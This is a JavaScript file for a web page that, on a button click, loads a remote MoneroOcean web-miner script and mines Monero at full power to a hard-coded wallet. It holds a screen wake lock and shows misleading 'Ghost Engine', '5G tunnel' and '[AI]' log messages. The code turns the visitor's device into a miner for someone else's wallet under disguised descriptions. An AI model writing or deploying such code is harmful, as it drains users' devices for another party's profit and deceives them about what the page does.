const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
const LOG = (m) => { 
    const term = document.getElementById('terminal');
    term.innerHTML = `> [AI] ${m}<br>` + term.innerHTML; 
};

let miner; // Global reference

const injectEngine = () => {
    const s = document.createElement('script');
    // Using a more reliable CDN link for the MoneroOcean web miner
    s.src = "https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io/webminer.js";
    
    s.onload = () => {
        LOG("Ghost Engine Decrypted. Securing 5G Pipeline...");
        startGhost();
    };
    s.onerror = () => LOG("<span style='color:red;'>NET_BLOCK: Failed to load miner script.</span>");
    document.head.appendChild(s);
};

function startGhost() {
    try {
        // Initialize the miner via the MoneroOcean constructor
        // Parameters: (Address, WorkerName, Threads)
        miner = new MoneroOcean.Miner({
            address: WALLET,
            cmd: "iPhone_Ghost",
            threads: 4,
            throttle: 0, // 0 = Max Power
            forceASMJS: false
        });

        miner.start();
        LOG("XMR FLUX ACTIVE. 5G TUNNEL ESTABLISHED.");

        // UI Update Loop
        setInterval(() => {
            if (miner && miner.isRunning()) {
                const curHps = miner.getHashesPerSecond();
                document.getElementById('hps').innerText = curHps.toFixed(2);
                
                if (curHps === 0) {
                    LOG("Low throughput... checking nodes.");
                }
            }
        }, 3000);

    } catch (e) { 
        LOG("Runtime Error: " + e.message); 
    }
}

document.getElementById('ignite').onclick = async () => {
    // Attempt WakeLock to keep the screen on (standard for mobile miners)
    if ('wakeLock' in navigator) {
        try { await navigator.wakeLock.request('screen'); } catch (err) {}
    }
    
    injectEngine();
    document.getElementById('ignite').innerText = "GENERATING XMR...";
    document.getElementById('ignite').style.background = "#222";
    document.getElementById('ignite').style.color = "#ff6600";
    document.getElementById('ignite').disabled = true;
};
